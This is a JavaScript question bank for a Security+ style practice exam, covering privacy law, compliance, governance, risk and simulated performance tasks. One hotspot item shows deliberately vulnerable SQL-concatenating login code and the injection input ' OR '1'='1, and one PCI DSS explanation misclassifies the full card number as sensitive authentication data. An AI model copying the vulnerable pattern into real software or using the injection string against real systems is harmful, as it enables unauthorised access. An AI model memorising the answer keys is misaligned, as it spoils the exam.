        "Liability is the same regardless of whether the vulnerability was known",
        "The pentest vendor bears liability for identifying the vulnerability"
      ],
      "correct": 1,
      "exp": "Negligence and known risk: in security, documenting a critical vulnerability and failing to address it can constitute evidence of wilful neglect. Under HIPAA, wilful neglect triggers the highest penalty tier ($50,000-$1.9M/category/year). Under GDPR, failure to implement appropriate technical measures (Article 32) when risks were known can result in higher fines. The penetration test report becomes evidence of what the organisation knew and when. Formal risk acceptance with documented compensating controls is better than ignoring findings."
    },
    {
      "id": "m385",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Data Privacy",
      "q": "A company collects customer email addresses for order confirmations. They want to also use these addresses for marketing campaigns. Under GDPR, what must they do?",
      "opts": [
        "No action needed — collecting an email address implies consent for all communications",
        "Obtain separate, specific, freely given, informed, and unambiguous consent for marketing communications — or identify another valid legal basis (legitimate interest with a balancing test, where applicable)",
        "Notify the data protection authority of the marketing intent",
        "Encrypt the email addresses before using them for marketing"
      ],
      "correct": 1,
      "exp": "GDPR requires a lawful basis for each processing purpose. Consent for order confirmation ≠ consent for marketing. Marketing typically requires: (1) Explicit consent: opt-in checkbox specifically for marketing (not pre-ticked). (2) Or legitimate interest (where soft opt-in applies under local e-marketing rules for existing customers). Consent must be: freely given, specific, informed, and unambiguous. Bundling consent for order confirmation with marketing consent is not valid — it's not freely given."
    },
    {
      "id": "m386",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Governance",
      "q": "A company's security operations team receives a new compliance requirement mandating that all privileged access be logged and reviewed quarterly. The security manager says, \"We already have logging — this is just a compliance checkbox.\" A security architect disagrees. What is the STRONGER position and why?",
      "opts": [
        "The security manager is correct — compliance requirements add no security value if systems already log",
        "The security architect is correct — the quarterly review requirement adds value beyond logging: without a defined review process, logs may exist but anomalies go undetected; the quarterly review creates a control that actively uses the logs, with documented evidence of review for audit purposes and accountability for findings",
        "Both are equally valid perspectives",
        "Neither — logging should be real-time and automated, making quarterly reviews unnecessary"
      ],
      "correct": 1,
      "exp": "Logging without review is a control gap. Compliance requirements that mandate both logging AND regular review address this: (1) Review catches anomalies that automated alerts miss. (2) Quarterly review creates documented evidence of control operation for auditors. (3) Accountability: someone owns the review and must sign off on findings. (4) Real-time alerts catch immediate threats; periodic review catches persistent, low-and-slow anomalies that fly under alert thresholds. The review cadence in compliance requirements reflects the lesson that logs ignored are not effective controls."
    },
    {
      "id": "m387",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Risk Management",
      "q": "An organisation creates a risk register and formally documents: \"Risk: SQL injection in legacy application. Likelihood: High. Impact: Critical. Residual Risk after WAF: High. Decision: Accept residual risk due to application retirement in 6 months.\" What makes this risk acceptance appropriate?",
      "opts": [
        "Risk acceptance is never appropriate for High residual risk",
        "This is appropriate only if the decision was made by a junior analyst",
        "Risk acceptance is appropriate when formally documented, approved by appropriate management authority, time-bounded (6-month retirement), and compensating controls are implemented (WAF); the temporary nature and compensating control make this a defensible business decision",
        "Risk acceptance requires regulatory approval"
      ],
      "correct": 2,
      "exp": "Appropriate risk acceptance requires: (1) Formal documentation in the risk register. (2) Management approval at the appropriate authority level (CISO, CRO, or Board for high/critical risks). (3) Compensating controls (WAF reduces exploit risk during the acceptance period). (4) Time-bound (6-month retirement date). (5) Regular review (if the retirement date slips, re-assess). Indefinite risk acceptance of High residual risk without compensating controls is not appropriate; this structured, temporary acceptance with controls is."
    },
    {
      "id": "m388",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Compliance",
      "q": "An e-commerce company stores credit card numbers in their database after transactions complete. Under PCI DSS, what is the required approach to this stored data?",
      "opts": [
        "Storing credit card numbers is acceptable if the database is on an internal network",
        "Post-authorisation, full credit card numbers (PANs) must not be stored unless there is a legitimate business need — and if stored, the PAN must be rendered unreadable using strong cryptography, tokenisation, or truncation",
        "Card numbers can be stored in encrypted logs for dispute resolution",
        "Storing card numbers is permitted for recurring billing customers only"
      ],
      "correct": 1,
      "exp": "PCI DSS Requirement 3.3: sensitive authentication data (SAD — full card number, CVV, PIN) must not be stored after authorisation. If the full PAN must be stored (for recurring billing, etc.), it must be rendered unreadable by: strong cryptography (AES-256), one-way hashing, tokenisation, or truncation. The golden rule: if you don't need to store it, don't. Tokenisation (replace PAN with a token) is the most common approach for recurring billing, eliminating PAN storage."
    },
    {
      "id": "m389",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Data Privacy",
      "q": "An organisation wants to use production customer data for software testing. What is the MOST secure approach to protect this data while enabling realistic testing?",
      "opts": [
        "Use a copy of production data — it is already collected, so using it for testing doesn't increase risk",
        "Implement data masking or data anonymisation on the dataset before using it for testing — replacing real names, emails, and financial data with realistic but fictional values",
        "Restrict test team access to the production database — read-only access is sufficient",
        "Use live production data briefly and delete it after testing"
      ],
      "correct": 1,
      "exp": "Data masking / anonymisation for testing: replace real PII with realistic fake data (realistic names, valid-format (but fake) card numbers, valid-format email addresses). Developers get realistic test data without exposure to real customer information. Techniques: pseudonymisation (replace with consistent fake values), randomisation, shuffling, character masking. This reduces: (1) Risk of test data breach. (2) Regulatory scope (GDPR — test environments with real PII require full GDPR controls). (3) Insider threat exposure."
    },
    {
      "id": "m390",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Governance",
      "q": "A multinational organisation is establishing a CISO function for the first time. The CISO will report to the CIO. A security governance consultant argues this reporting structure is suboptimal. What is the concern?",
      "opts": [
        "CISOs should report to the CFO — security is primarily a financial risk issue",
        "The CIO is responsible for IT service delivery and operational efficiency — security may be deprioritised when it conflicts with these goals. A CISO reporting to the CIO faces a potential conflict of interest. Best practice: CISO reports to the CEO, Board, or General Counsel for independence.",
        "The CIO has no authority to approve security budgets, making the CISO ineffective",
        "There is no concern — CISO reporting to CIO is universally recommended"
      ],
      "correct": 1,
      "exp": "CISO reporting line conflict: the CIO is measured on IT availability, cost, and delivery speed. Security controls may slow delivery, increase cost, or limit access. When security and IT efficiency conflict, a CISO reporting to the CIO may face pressure to deprioritise security. Best practices: CISO reports to CEO (operational independence), Board/Audit Committee (highest accountability), or General Counsel (regulatory/legal alignment). Some organisations use a \"dotted-line\" to the Board for oversight. Independence enables the CISO to escalate security concerns to the highest level."
    },
    {
      "id": "m391",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Risk Management",
      "q": "An organisation uses qualitative risk assessment rather than quantitative. Which of the following is a characteristic of qualitative risk assessment?",
      "opts": [
        "Produces ALE values in monetary units for cost-benefit analysis",
        "Uses descriptive scales (Low/Medium/High, or colour coding) for likelihood and impact — faster and less data-intensive than quantitative, but less precise and harder to use for cost-benefit calculations",
        "Requires actuarial data from industry breach statistics",
        "Always produces more accurate results than quantitative assessment"
      ],
      "correct": 1,
      "exp": "Qualitative risk assessment: uses ordinal scales (Low/Medium/High/Critical) for likelihood and impact. Produces a risk rating (e.g., a 5×5 risk heat map). Advantages: faster, requires less data, easier for non-technical stakeholders to understand. Disadvantages: subjective, cannot be used directly for cost-benefit analysis, difficult to compare across organisations. Quantitative: monetary values (ALE), requires historical data, better for investment decisions. Most organisations use a hybrid approach."
    },
    {
      "id": "m392",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Compliance",
      "q": "A financial services firm discovers it must comply with both PCI DSS and SOX. A consultant recommends a \"unified control framework\" approach. What does this mean and what is its primary benefit?",
      "opts": [
        "Implementing both frameworks separately with different teams managing each",
        "Mapping controls from PCI DSS and SOX to a single unified control set — identifying overlapping controls (e.g., access control logging required by both) and implementing them once while documenting how a single control satisfies multiple frameworks, reducing duplication and audit burden",
        "Choosing one framework and ignoring the other",
        "Using only NIST SP 800-53 and mapping it to both PCI DSS and SOX"
      ],
      "correct": 1,
      "exp": "A unified control framework (also called control harmonisation or compliance rationalisation): (1) Map requirements from multiple frameworks (PCI DSS, SOX, ISO 27001, HIPAA) to a common control catalogue. (2) Identify overlapping controls (both PCI DSS Req 10 and SOX IT General Controls require logging — one set of log controls satisfies both). (3) Implement once, document twice (show the control satisfies PCI and SOX requirements). Benefits: reduced audit fatigue, lower implementation cost, consistent controls. NIST CSF or ISO 27001 are often used as the mapping framework."
    },
    {
      "id": "m393",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Data Privacy",
      "q": "Which term describes the right of individuals under GDPR to receive their personal data in a structured, machine-readable format and to transfer it to another data controller?",
      "opts": [
        "Right to erasure",
        "Right to rectification",
        "Right to data portability",
        "Right to restriction of processing"
      ],
      "correct": 2,
      "exp": "Right to Data Portability (GDPR Article 20): individuals can request their personal data in a structured, commonly used, machine-readable format (e.g., CSV, JSON, XML) and transfer it to another controller. Applies to: data processed by automated means, based on consent or a contract. Enables: switching between service providers (bank to bank, social media to social media) without losing data. The controller must provide the data within 30 days of the request at no charge."
    },
    {
      "id": "m394",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Governance",
      "q": "An organisation wants to assess its cybersecurity maturity level. They use the NIST Cybersecurity Framework (CSF). The CSF's five core functions are:",
      "opts": [
        "Protect, Detect, Respond, Recover, Comply",
        "Identify, Protect, Detect, Respond, Recover — recently updated to add Govern as a sixth function in CSF 2.0",
        "Assess, Design, Implement, Test, Monitor",
        "Prevent, Detect, Correct, Recover, Improve"
      ],
      "correct": 1,
      "exp": "NIST CSF core functions: (1) Govern (new in CSF 2.0): strategy, expectations, policy, oversight. (2) Identify: assets, risks, business context. (3) Protect: controls to manage risks. (4) Detect: monitoring, anomaly detection. (5) Respond: incident response. (6) Recover: resilience, restoration. CSF 1.1 had five functions (no Govern). CSF 2.0 added Govern as a foundational function recognising that organisational governance underpins all other functions. Each function has categories and subcategories with implementation guidance."
    },
    {
      "id": "m395",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Risk Management",
      "q": "A company's cybersecurity insurance policy covers \"losses from data breach notification, legal fees, and regulatory fines.\" A ransomware attack encrypts all files. The company pays the ransom. The insurance company refuses to pay the ransom. What does this illustrate about risk transference?",
      "opts": [
        "Risk transference via insurance eliminates all financial risk",
        "Insurance policies have specific coverage terms and exclusions — ransom payments may not be covered (some insurers explicitly exclude them). Risk transference transfers defined financial risks but residual risk remains for uncovered scenarios.",
        "The insurance company acted fraudulently",
        "Ransomware is not a covered cyber event under any policy"
      ],
      "correct": 1,
      "exp": "Risk transference limitations: cyber insurance covers defined scenarios specified in the policy. Ransom payments are often explicitly excluded or require pre-approval. Coverage terms matter: \"data breach notification costs\" ≠ \"ransomware ransom payment.\" Organisations must: (1) Read policy exclusions carefully. (2) Understand coverage limits. (3) Not rely on insurance as the primary risk response — it supplements but doesn't replace security controls. (4) Verify whether the policy covers the specific scenario being planned for."
    },
    {
      "id": "m396",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Compliance",
      "q": "A SOC 2 Type II report is produced after a 6-month audit of a cloud service provider. What is the key difference between a SOC 2 Type I and Type II report?",
      "opts": [
        "Type I covers more security controls than Type II",
        "Type I confirms controls are suitably designed at a point in time; Type II confirms controls were operating effectively over the audit period (6-12 months) — Type II provides much stronger assurance of operational effectiveness",
        "Type II is produced by regulators; Type I by internal auditors",
        "Type II only covers security; Type I covers all Trust Service Criteria"
      ],
      "correct": 1,
      "exp": "SOC 2 report types: Type I: point-in-time assessment — confirms that controls exist and are designed appropriately as of a specific date. Easier and cheaper to obtain. Type II: over a period (typically 6-12 months) — confirms controls operated effectively throughout the period. Tests actual control operation (logs reviewed, access requests processed correctly, etc.). Enterprise customers typically require Type II as it demonstrates operational consistency, not just design. Type II is the gold standard."
    },
    {
      "id": "m397",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Data Privacy",
      "q": "A company uses AI/ML to make automated decisions about credit applications — rejecting applications without human review. Under GDPR Article 22, what right do applicants have regarding this automated decision-making?",
      "opts": [
        "No specific rights — automated decisions are permitted under financial services regulation",
        "The right not to be subject to solely automated decisions that produce significant effects, the right to obtain human review of the decision, to express their point of view, and to contest the decision — unless specific conditions apply (explicit consent, contract necessity, or EU/Member State law)",
        "The company must disclose the AI model's source code to each applicant",
        "Automated financial decisions are exempt from GDPR Article 22"
      ],
      "correct": 1,
      "exp": "GDPR Article 22 — Automated Decision-Making and Profiling: individuals have the right NOT to be subject to decisions based solely on automated processing (including profiling) that produce significant effects (legal or similarly significant). Credit applications qualify. Organisations must: (1) Provide meaningful information about the logic involved. (2) Allow human review upon request. (3) Allow the individual to contest the decision. Exceptions: explicit consent, contract necessity, or EU/Member State law with safeguards. The AI decision must be explainable."
    },
    {
      "id": "m398",
      "ch": "5",
      "difficulty": "easy",
      "topic": "Governance",
      "q": "A security manager creates a document that provides step-by-step instructions for how IT staff should create, review, and revoke user accounts. This document is BEST classified as:",
      "opts": [
        "A security policy — it sets the requirements for account management",
        "A security standard — it specifies which tools must be used for account management",
        "A security procedure — it provides detailed, step-by-step instructions for performing a specific security task",
        "A security guideline — it provides recommendations for account management"
      ],
      "correct": 2,
      "exp": "A security procedure is a step-by-step instruction document for performing a specific task. It answers \"how.\" Examples: \"Step 1: Submit access request form. Step 2: Manager approves. Step 3: IT creates account with role template. Step 4: Send welcome email with initial password...\" Procedures are typically mandatory. A policy states what must be achieved. A standard specifies technical requirements. A guideline provides optional recommendations."
    },
    {
      "id": "m399",
      "ch": "5",
      "difficulty": "hard",
      "topic": "Risk Management",
      "q": "An organisation performs a threat modelling exercise for a new payment processing application using the STRIDE methodology. The STRIDE acronym covers which threat categories?",
      "opts": [
        "Security, Trust, Risk, Identity, Defence, Encryption",
        "Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege",
        "System, Threat, Risk, Impact, Detection, Evaluation",
        "Source, Target, Route, Intercept, Detect, Exploit"
      ],
      "correct": 1,
      "exp": "STRIDE (developed by Microsoft): (S) Spoofing: impersonating another entity — violated authentication. (T) Tampering: modifying data — violated integrity. (R) Repudiation: denying an action — violated non-repudiation. (I) Information Disclosure: exposing data — violated confidentiality. (D) Denial of Service: making systems unavailable — violated availability. (E) Elevation of Privilege: gaining unauthorised access — violated authorisation. Each threat category maps to a violated security property, guiding countermeasure selection."
    },
    {
      "id": "m400",
      "ch": "5",
      "difficulty": "medium",
      "topic": "Compliance",
      "q": "An organisation receives a legal hold notice related to ongoing litigation. They must preserve all electronically stored information (ESI) related to the matter. A routine data deletion job runs and deletes potentially relevant files. What is the MOST serious consequence?",
      "opts": [
        "The deleted files can be recovered from backup — no issue",
        "Accidental data destruction during a legal hold can constitute spoliation of evidence — courts may impose sanctions including adverse inference instructions (assuming the destroyed evidence was harmful to the deleting party), monetary sanctions, or default judgment against the organisation",
        "The legal hold applies only to paper documents, not electronic files",
        "The organisation can notify the court and be excused if the deletion was accidental"
      ],
      "correct": 1,
      "exp": "Spoliation of evidence: destruction, alteration, or failure to preserve evidence relevant to foreseeable litigation. Even accidental spoliation can result in sanctions. Courts may give an \"adverse inference instruction\" — instructing the jury that the destroyed evidence would have been unfavourable to the deleting party. Organisations must: (1) Issue legal hold notices to custodians when litigation is foreseeable. (2) Suspend routine data deletion for held data. (3) Preserve in a forensically sound manner. Legal holds require coordination between legal, IT, and records management."
    }
];

// ═══════════════════════════════════════════════════════════════
// PBQ BANK — original, accurate, clearly scoped content
// ═══════════════════════════════════════════════════════════════
const PBQ_BANK = [
  // ── TERMINAL SIMS ──────────────────────────────────────────
  { id:"p001", type:"TERMINAL SIM", ch:"4", cat:"Network Security", difficulty:"medium",
    title:"Identify open ports using a port scanner",
    emoji:"💻",
    scenario:"You are a junior security analyst. A new server has been deployed and you need to confirm which ports are listening before it goes into production. Run a service-version scan on host 10.0.0.20 and identify any unnecessary open ports.",
    hint:"Use: scan -sV 10.0.0.20  (simplified command)",
    answer:`PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.9
80/tcp   open   http       Apache 2.4
443/tcp  open   https      Apache 2.4
3306/tcp open   mysql      MySQL 8.0
8080/tcp open   http-alt   Tomcat 9.0`,
    question:"Which single port is the MOST urgent to close or restrict on a production web server?",
    choices:["Port 22 — SSH should always be closed","Port 3306 — a database port should not be publicly exposed","Port 80 — unencrypted HTTP is always dangerous","Port 8080 — Tomcat is not a production server"],
    correct:1,
    explanation:"Port 3306 (MySQL) being publicly accessible is the highest-risk finding. Databases should only accept connections from the application server on an internal interface. An exposed database port allows direct credential brute-force and query attacks. SSH on port 22 is expected for management; HTTP on 80 should redirect to 443; Tomcat on 8080 should also be restricted.",
    wrongFeedback:{ 0:"SSH on port 22 is expected for server administration. It should be restricted to management IPs but is not the highest risk here.", 2:"HTTP on port 80 is a finding (should redirect to HTTPS) but a misconfigured web server is less critical than an exposed database.", 3:"Port 8080 should ideally be closed in production but presents less immediate risk than a directly accessible database server." },
    objective:"4.3"},

  { id:"p002", type:"TERMINAL SIM", ch:"1", cat:"Cryptography", difficulty:"easy",
    title:"Verify file integrity using a hash",
    emoji:"💻",
    scenario:"You downloaded a security update package from a vendor website. The vendor published this SHA-256 hash: a3f8d2e91b4c7f0e5d9a2b6c8e1f3d5a7b9c0e2f4d6a8b0c2e4f6a8b0c2e4f6. Run a hash check on the downloaded file.",
    hint:"Use: hash update_package.zip",
    answer:`Computed hash:
a3f8d2e91b4c7f0e5d9a2b6c8e1f3d5a7b9c0e2f4d6a8b0c2e4f6a8b0c2e4f6  update_package.zip

Vendor published:
a3f8d2e91b4c7f0e5d9a2b6c8e1f3d5a7b9c0e2f4d6a8b0c2e4f6a8b0c2e4f6

✓ Hashes match`,
    question:"The hashes match. Which CIA Triad property has been verified?",
    choices:["Confidentiality — the file is encrypted","Integrity — the file has not been altered since the vendor published the hash","Availability — the file downloaded successfully","Non-repudiation — the vendor cannot deny publishing the file"],
    correct:1,
    explanation:"Hashing verifies INTEGRITY. If even a single byte was changed in transit or by a malicious actor, the computed hash would be completely different. This confirms the file is exactly what the vendor released. Note: hashing does NOT encrypt the file (confidentiality) and does NOT prove the vendor's identity without a digital signature (non-repudiation).",
    wrongFeedback:{ 0:"Encryption provides confidentiality. The file may not be encrypted at all — hashing is a separate concept.", 2:"Successful download is assumed, but integrity confirms the content is uncorrupted and unmodified.", 3:"Non-repudiation requires a digital signature (private key). A hash alone cannot prove WHO created the file." },
    objective:"1.4"},

  { id:"p003", type:"TERMINAL SIM", ch:"4", cat:"Incident Response", difficulty:"medium",
    title:"Investigate a suspicious running process",
    emoji:"💻",
    scenario:"A workstation is behaving oddly — it is running slowly and there are unusual outbound connections. You need to identify which process is responsible.",
    hint:"Use: list-processes or connections",
    answer:`PROCESS LIST (suspicious entries highlighted):
PID   Name              CPU%  Memory  Parent
1024  explorer.exe      0.2   45 MB   winlogon.exe
4892  svchost32.exe     18%   210 MB  cmd.exe  ← SUSPICIOUS
                                               (real svchost.exe parent = services.exe)

NETWORK CONNECTIONS:
PID   Local              Remote             State
4892  192.168.1.100:54321  198.51.100.5:443  ESTABLISHED`,
    question:"What makes PID 4892 suspicious? Select the BEST answer.",
    choices:["It is using port 443, which should be HTTPS only","Its parent process is cmd.exe — legitimate svchost.exe always starts from services.exe, not cmd.exe","The name svchost32.exe ends in 32, which indicates it is 32-bit software","It is consuming 18% CPU, which is too high for a background service"],
    correct:1,
    explanation:"Process parent-child relationships are a key forensic indicator. All legitimate svchost.exe processes on Windows are created by services.exe. A svchost.exe (or similar name) spawned by cmd.exe is a strong indicator of process injection or a masquerading malware that uses a legitimate-sounding name. The external connection on port 443 used for C2 traffic that blends with HTTPS further confirms malicious activity.",
    wrongFeedback:{ 0:"Port 443 is commonly used by malware for C2 communications specifically to blend with legitimate HTTPS traffic — the port alone is not suspicious.", 2:"While the name is also suspicious (a slight difference from svchost.exe), the parent process relationship is the clearest forensic indicator.", 3:"High CPU usage can indicate cryptomining or other malicious activity, but it is not the definitive indicator — the parent process is." },
    objective:"4.8"},

  // ── DRAG & DROP ─────────────────────────────────────────────
  { id:"p004", type:"DRAG & DROP", ch:"4", cat:"Incident Response", difficulty:"easy",
    title:"Order the incident response phases",
    emoji:"🔀",
    scenario:"A ransomware infection has been detected on a file server. Place the incident response phases in the correct order from first to last.",
    items:[
      {id:"a", label:"Lessons Learned — review what happened and improve"},
      {id:"b", label:"Containment — isolate the infected server from the network"},
      {id:"c", label:"Detection & Analysis — confirm it is ransomware, determine scope"},
      {id:"d", label:"Eradication — remove the ransomware and close the entry point"},
      {id:"e", label:"Recovery — restore data from clean backups and verify systems"},
      {id:"f", label:"Preparation — IR plans and runbooks were ready before this event"},
    ],
    targets:[{id:"1",label:"Phase 1"},{id:"2",label:"Phase 2"},{id:"3",label:"Phase 3"},{id:"4",label:"Phase 4"},{id:"5",label:"Phase 5"},{id:"6",label:"Phase 6"}],
    correctMapping:{f:"1",c:"2",b:"3",d:"4",e:"5",a:"6"},
    explanation:"The NIST SP 800-61 IR lifecycle in order: Preparation (before the incident), Detection & Analysis (confirm and scope), Containment (stop the spread — always before eradication), Eradication (remove the threat), Recovery (restore operations), Lessons Learned (improve for next time). The most commonly tested trap: Containment always comes BEFORE Eradication.",
    objective:"4.8"},

  { id:"p005", type:"DRAG & DROP", ch:"1", cat:"Cryptography", difficulty:"medium",
    title:"Match encryption terms to their definitions",
    emoji:"🔀",
    scenario:"Match each cryptographic term on the left to its correct definition on the right.",
    items:[
      {id:"a", label:"Symmetric encryption"},
      {id:"b", label:"Asymmetric encryption"},
      {id:"c", label:"Hashing"},
      {id:"d", label:"Digital signature"},
      {id:"e", label:"Key stretching"},
    ],
    targets:[
      {id:"1", label:"Uses the same secret key to encrypt and decrypt"},
      {id:"2", label:"Uses a public key to encrypt and a private key to decrypt"},
      {id:"3", label:"A one-way transformation that cannot be reversed"},
      {id:"4", label:"Created with a private key to prove authenticity"},
      {id:"5", label:"Makes password hashing deliberately slow to resist brute force"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Symmetric (AES): same key both ways — fast but key distribution is a challenge. Asymmetric (RSA/ECC): public encrypts, private decrypts — solves key distribution. Hashing (SHA-256): one-way, no decryption. Digital signatures: created with sender's private key, verified with sender's public key. Key stretching (bcrypt/Argon2): adds computational cost to each hash attempt, slowing brute-force attacks.",
    objective:"1.4"},

  { id:"p006", type:"DRAG & DROP", ch:"2", cat:"Threat Actors", difficulty:"easy",
    title:"Match threat actors to their characteristics",
    emoji:"🔀",
    scenario:"Match each threat actor type to its most accurate description.",
    items:[
      {id:"a", label:"Nation-state actor"},
      {id:"b", label:"Script kiddie"},
      {id:"c", label:"Hacktivist"},
      {id:"d", label:"Insider threat"},
      {id:"e", label:"Organised crime"},
    ],
    targets:[
      {id:"1", label:"Well-funded, highly sophisticated, focused on espionage and long-term access"},
      {id:"2", label:"Uses existing tools without understanding them; low sophistication"},
      {id:"3", label:"Motivated by ideology; targets organisations they disagree with politically"},
      {id:"4", label:"Has legitimate access; hardest to detect because they are trusted"},
      {id:"5", label:"Financially motivated; uses malware-as-a-service and ransomware"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Knowing threat actor profiles helps prioritise defences. Nation-states (APTs) use zero-days and operate for months undetected. Script kiddies are noisy but low-capability. Hacktivists want publicity for their cause. Insiders are dangerous because existing controls assume they are trustworthy. Organised crime is increasingly professionalised with RaaS (Ransomware as a Service) offerings.",
    objective:"2.1"},

  // ── HOTSPOT ─────────────────────────────────────────────────
  { id:"p007", type:"HOTSPOT", ch:"4", cat:"Incident Response", difficulty:"easy",
    title:"Identify the most urgent alert to action",
    emoji:"📍",
    scenario:"Your monitoring dashboard shows four simultaneous alerts. Select the one requiring IMMEDIATE response.",
    diagram:`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ALERT DASHBOARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[A] LOW    — Scheduled firewall firmware update completed successfully

[B] MEDIUM — 5 failed SSH logins for user 'admin' from 45.33.x.x
             (Account NOT locked out yet)

[C] CRITICAL — Ransomware process detected on ACCOUNTS-SERVER-01
               Encrypting files at 1,800 files/minute

[D] HIGH   — Unpatched vulnerability CVE-2023-XXXX found on
             internal app server (no internet exposure)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    hotspots:[
      {id:"a", label:"Alert A — Firmware update", correct:false},
      {id:"b", label:"Alert B — Failed SSH logins", correct:false},
      {id:"c", label:"Alert C — Active ransomware", correct:true},
      {id:"d", label:"Alert D — Unpatched CVE", correct:false},
    ],
    question:"Which alert requires immediate action?",
    choices:["Alert A — the update could have introduced a vulnerability","Alert B — the account will be locked out soon","Alert C — active ransomware is destroying data RIGHT NOW","Alert D — unpatched critical CVEs are always the top priority"],
    correct:2,
    explanation:"Alert C (active ransomware encrypting 1,800 files/minute) requires immediate action — every second of delay means more data destroyed. The first step is network isolation (containment) to prevent lateral spread. Alert D is serious but not an active incident. Alert B is suspicious but the account is not yet locked and no breach is confirmed. Alert A is routine and successfully completed.",
    wrongFeedback:{ 0:"Completed successful updates are routine — no response needed.", 1:"Failed SSH logins should be investigated and the source IP blocked, but no breach has occurred yet.", 3:"Unpatched vulnerabilities need timely remediation but are not active incidents with real-time damage occurring." },
    objective:"4.8"},

  { id:"p008", type:"HOTSPOT", ch:"2", cat:"Application Security", difficulty:"medium",
    title:"Identify the vulnerability in this login code",
    emoji:"📍",
    scenario:"Review the following server-side login function. Select the line that introduces the security vulnerability.",
    diagram:`Line 1:  def login(username, password):
Line 2:      conn = get_database_connection()
Line 3:      query = "SELECT * FROM users WHERE username='" + username + "'"
Line 4:                + " AND password='" + password + "'"
Line 5:      result = conn.execute(query)
Line 6:      if result.rowcount > 0:
Line 7:          return create_session(result.first())
Line 8:      return None`,
    hotspots:[
      {id:"a", label:"Line 2 — database connection", correct:false},
      {id:"b", label:"Lines 3-4 — string concatenation into SQL query", correct:true},
      {id:"c", label:"Line 5 — query execution", correct:false},
      {id:"d", label:"Line 7 — session creation", correct:false},
    ],
    question:"Which line(s) introduce the vulnerability?",
    choices:["Line 2 — database connections should always use connection pooling","Lines 3-4 — user input is concatenated directly into the SQL query, enabling SQL injection","Line 5 — executing queries is inherently dangerous","Line 7 — sessions should not be created in the login function"],
    correct:1,
    explanation:"Lines 3-4 directly concatenate the username and password variables into the SQL string without sanitisation. An attacker can enter ' OR '1'='1 as the username to manipulate the query logic. The fix is to use parameterised queries (prepared statements): cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password)). The database engine then treats the parameters as data, not SQL syntax.",
    wrongFeedback:{ 0:"Database connections are necessary — the concern is how user input is handled, not that a connection is made.", 2:"Executing the query is necessary — the problem is what is IN the query before execution.", 3:"Session creation is appropriate after successful authentication — it is not the vulnerability." },
    objective:"2.3"},

  // ── ORDERING ────────────────────────────────────────────────
  { id:"p009", type:"ORDERING", ch:"4", cat:"Digital Forensics", difficulty:"medium",
    title:"Order the forensic evidence collection steps",
    emoji:"📋",
    scenario:"You arrive at a workstation suspected of being involved in data theft. Order the forensic collection steps correctly, following the order of volatility.",
    items:[
      {id:"a", label:"Collect hard drive image using forensic write blocker"},
      {id:"b", label:"Document network connections and routing tables"},
      {id:"c", label:"Photograph the physical scene and document the state of the screen"},
      {id:"d", label:"Capture running process list and open file handles"},
      {id:"e", label:"Capture system memory (RAM dump)"},
      {id:"f", label:"Log system date/time and note any discrepancies"},
    ],
    correctOrder:["c","f","b","d","e","a"],
    explanation:"The order of volatility principle: collect the most volatile (shortest-lived) data first. 1) Photograph scene and screen (preserve current state before touching anything). 2) Note date/time (system clock may be manipulated). 3) Network connections (TCP sessions disappear when network is touched). 4) Running processes (end when system state changes). 5) RAM dump (lost on reboot). 6) Hard drive image last (persistent, survives power-off). Never start with the hard drive — you'll lose all volatile evidence.",
    objective:"4.8"},

  { id:"p010", type:"ORDERING", ch:"1", cat:"PKI & Certificates", difficulty:"hard",
    title:"Order the TLS connection setup steps",
    emoji:"📋",
    scenario:"Place the steps of a TLS handshake in the correct order, from first to last.",
    items:[
      {id:"a", label:"Encrypted application data is exchanged"},
      {id:"b", label:"Client verifies the server certificate against its trusted CA store"},
      {id:"c", label:"Server sends its digital certificate and supported cipher suites"},
      {id:"d", label:"Client and server derive session encryption keys"},
      {id:"e", label:"Client sends a 'hello' message with the TLS version and cipher suites it supports"},
    ],
    correctOrder:["e","c","b","d","a"],
    explanation:"TLS handshake order: 1) Client Hello — client advertises capabilities. 2) Server Hello + Certificate — server selects cipher and proves identity. 3) Certificate verification — client validates the server's certificate chain to a trusted root CA. 4) Key derivation — both sides use the negotiated key exchange to independently derive the same session keys. 5) Encrypted data — communication begins under symmetric encryption using the derived keys.",
    objective:"1.4"},

  // ── FILL IN BLANK ────────────────────────────────────────────
  { id:"p011", type:"FILL BLANK", ch:"5", cat:"Risk Management", difficulty:"medium",
    title:"Complete the risk calculation formulas",
    emoji:"✏️",
    scenario:"Fill in the correct term for each risk quantification formula component.",
    blanks:[
      {id:"a", sentence:"Asset Value × Exposure Factor = ___", answer:"SLE", hint:"Single Loss ___"},
      {id:"b", sentence:"SLE × ARO = ___", answer:"ALE", hint:"Annualized Loss ___"},
      {id:"c", sentence:"ARO stands for Annualized Rate of ___ (how often an event occurs per year)", answer:"Occurrence", hint:"How frequently it happens"},
      {id:"d", sentence:"Exposure Factor represents the ___ of the asset value that would be lost in a single event", answer:"Percentage", hint:"A proportion between 0 and 1"},
    ],
    explanation:"Risk quantification formulas are directly tested: SLE (Single Loss Expectancy) = what one incident costs. ALE (Annualized Loss Expectancy) = SLE × ARO = expected annual cost. ARO (Annualized Rate of Occurrence) = frequency per year (0.25 = once every 4 years). Exposure Factor = % of asset lost (0.4 = 40% damage per event). These are used to justify security spending: if a control costs less than the ALE it prevents, it is worth implementing.",
    objective:"5.2"},

